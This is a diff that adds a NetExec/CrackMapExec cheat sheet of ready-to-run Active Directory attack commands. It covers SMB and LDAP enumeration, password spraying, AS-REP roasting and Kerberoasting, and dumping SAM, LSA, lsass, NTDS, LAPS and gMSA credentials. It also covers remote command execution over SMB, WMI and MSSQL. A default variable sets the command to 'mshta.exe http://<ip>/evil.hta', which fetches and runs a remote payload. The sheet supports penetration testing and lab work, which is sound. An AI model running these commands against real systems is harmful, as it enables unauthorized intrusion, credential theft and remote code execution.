@@ -1,0 +1,222 @@
+% Netexec / CrackMapexec
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+;$ relay-file: 'relay-list.txt'
+;$ command: 'mshta.exe http://<ip>/evil.hta'
+
+# SMB Connectivity Check
+nxc smb <ip>
+
+
+## enumerating SMB shares
+
+# SMB share NULL session
+nxc smb <ip> -u '' -p ''
+# SMB share anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth
+# SMB share Guest session
+nxc smb <ip> -u 'guest' -p ''
+# SMB share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>'  # or -H '<hash>'
+
+
+## spider SMB shares
+
+# spider SMB share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus
+# spider SMB share anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus
+# spider SMB share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus
+# spider SMB share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus
+
+# spider+download SMB share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# spider+download SMB share anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# spider+download SMB share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# spider+download SMB share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+
+
+## Working files on with SMB shares
+
+# netexec SMB Upload file on remote
+nxc smb <ip> -u '<username>' -p '<password>' --put-file <local-file> <remote-file>
+# netexec SMB Download file from remote
+nxc smb <ip> -u '<username>' -p '<password>' --get-file <remote-file> <local-file>
+
+
+# Get SMB relays with no SMB signing
+nxc smb <ip> --gen-relay-list <relay-file>
+
+
+# execute Command or file
+nxc smb <ip> -u '<username>' -p '<password>' -x '<command>'
+
+
+## enumerating Password Policy
+
+# Password Policy NULL session
+nxc smb <ip> -u '' -p '' --pass-pol
+# Password Policy anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --pass-pol
+# Password Policy Guest session
+nxc smb <ip> -u 'guest' -p '' --pass-pol
+# Password Policy Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --pass-pol
+
+
+## SMB password spraying
+
+# SMB Password Spray with user/pass list
+nxc smb <ip> -u user.txt -p pass.txt
+
+# SMB Password Spray with user/pass list (contiunue/no bruteforcing)
+nxc smb <ip> -u user.txt -p pass.txt --continue-on-success --no-bruteforce
+
+
+## enumerating Users
+
+# enumerate Users NULL session (SMB)
+nxc smb <ip> -u '' -p '' --users
+# enumerate Users NULL session (LDAP)
+nxc ldap <ip> -u '' -p '' --users
+# enumerate Users anonymous session (SMB)
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --users
+# enumerate Users anonymous session (LDAP)
+nxc ldap <ip> -u 'anonymous' -p '' --local-auth --users
+# enumerate Users Guest session (SMB)
+nxc smb <ip> -u 'guest' -p '' --users
+# enumerate Users Guest session (LDAP)
+nxc ldap <ip> -u 'guest' -p '' --users
+# enumerate Users Authenticated session (SMB)
+nxc smb <ip> -u '<username>' -p '<password>' --users
+# enumerate Users Authenticated session (LDAP)
+nxc ldap <ip> -u '<username>' -p '<password>' --users
+
+# enumerate users by bruteforcing the RID + save users list (10000 is optional)
+nxc smb <ip> -u guest -p '' --rid-brute 10000 --log rid-brute.txt
+# enumerate Logged-on Users (Authenticated)
+nxc smb <ip> -u '<username>' -p '<password>' --loggedon-users
+
+# Get user's description
+nxc ldap <ip> -u '<username>' -p '<password>' -M get-desc-users
+
+
+## enumerating Groups
+
+# enumerate Groups NULL session
+nxc smb <ip> -u '' -p '' --groups
+# enumerate Groups anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --groups
+# enumerate Groups Guest session
+nxc smb <ip> -u 'guest' -p '' --groups
+# enumerate Groups Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --groups
+
+
+## FTP
+
+# List files on FTP server
+nxc ftp <ip> -u '<username>' -p '<password>' --ls
+# List files on FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<path>'
+# Download file from FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --get '<file>'
+# Upload file from attacker to FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --put <LOCAL_FILE> <REMOTE_FILE>
+
+# Asreproast- Get and try cracking user account hash
+nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
+# Impacket Asreproast
+GetNPUsers.py <target> -usersfile users.txt -dc-ip <ip>
+# Kerberoasting - Get and try cracking SPN account hash
+nxc ldap <ip> -u '<username>' -p '<password>' --kerberoasting kerberoasting.txt --kdcHost <ip>
+# Impacket Kerberoasting
+GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip <ip> -dc-host <ip> <target> -target-domain <domain>
+
+## netexec Query LDAP
+
+
+# netexec Query LDAP (example 1)
+nxc ldap <ip> -u '' -p '' --query "(objectclass=*)" ""
+# netexec Query LDAP (example 2)
+nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=<username>)" ""
+# LDAPSearch Query LDAP
+ldapsearch -o ldif_wrap=no -xLLLH ldap://<ip> -D '<domain>\<username>' -w '<password>' -b "DC=intelligence,DC=htb" '(samaccountname=<username>)'
+
+
+## Passwords
+
+# extract the SAM File + Dump Cached Passwords
+nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
+# Dump lsass with lsassy module:
+nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
+# extract passwords from the NTDS (dcsync)
+nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
+
+## Get GPP policies
+
+# `gpp_password` decrypts passwords stored in the Group.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_password
+# `gpp_autologin` retrieves autologin information from the Registry.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
+
+## Group Managed Service Accounts (gMSA)
+
+# Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
+nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
+
+## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
+
+# Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
+nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
+
+## Check for Spooler Service
+nxc smb <ip> -u '<username>' -p '<password>' -M spooler
+
+## Check for WebDav Service
+nxc smb <ip> -u '<username>' -p '<password>' -M webdav
+
+## Azure - entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
+
+# Microsoft Online
+nxc smb <ip> -u '<username>' -p '<password>' -M msol # Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
+# Microsoft Online #2
+nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data\msol_dump\msol_dump.ps1
+
+
+## mssql_priv
+
+# netexec MsSQL (Check authentication)
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth --port 1434
+# netexec MsSQL (privesc module)
+nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
+# netexec MsSQL: execute Windows Commands (xp_cmdshell)
+nxc mssql <ip> -u sa -p '<password>' --local-auth -x whoami
+# execute MSSQL commands
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+
+## WMI
+
+# WMI: execute Commands
+nxc wmi <ip> -u '<username>' -p '<password>' -x whoami
+
+
+## Read DACL Rights
+
+# Read all the ACEs of a user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<username> ACTION=read
+# Read all rights PRINCIPAL user have on TARGET user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<t_user> ACTION=read PRINCIPAL=<p_user>
+# Find users with DCSync rights on this domain
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET_DN="DC=htb,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
+## enumerate Domain Trusts
+nxc ldap <ip> -u '<username>' -p '<password>' -M enum_trusts
